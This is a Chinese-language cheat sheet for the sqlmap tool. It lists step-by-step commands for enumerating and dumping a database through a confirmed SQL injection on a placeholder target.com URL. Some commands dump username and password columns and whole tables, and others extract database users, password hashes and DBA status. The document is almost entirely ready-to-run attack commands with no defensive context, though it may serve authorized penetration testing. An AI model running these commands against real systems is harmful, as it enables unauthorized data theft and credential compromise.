# sqlmap 数据库枚举

确认存在注入后，使用以下命令枚举数据库信息。

## 枚举流程（由浅入深）

### 1. 获取当前数据库名

```bash
sqlmap -u "http://target.com/page?id=1" --current-db --batch
```

### 2. 列出所有数据库

```bash
sqlmap -u "http://target.com/page?id=1" --dbs --batch
```

### 3. 列出指定数据库的表

```bash
sqlmap -u "http://target.com/page?id=1" -D target_db --tables --batch
```

### 4. 列出指定表的列

```bash
sqlmap -u "http://target.com/page?id=1" -D target_db -T users --columns --batch
```

### 5. 导出指定列的数据

```bash
sqlmap -u "http://target.com/page?id=1" -D target_db -T users -C username,password --dump --batch
```

### 6. 导出整个表

```bash
sqlmap -u "http://target.com/page?id=1" -D target_db -T users --dump --batch
```

## 其他信息收集

```bash
# 当前用户
sqlmap -u "URL" --current-user --batch

# 是否是DBA
sqlmap -u "URL" --is-dba --batch

# 所有用户及密码hash
sqlmap -u "URL" --users --passwords --batch

# 数据库Banner
sqlmap -u "URL" --banner --batch
```

## 注意事项

- `--dump` 会将数据保存到 `~/.local/share/sqlmap/output/<target>/dump/` 目录
- 大表导出时可以用 `--start` 和 `--stop` 限制行数
- 使用 `--count` 可以只获取行数而不导出数据
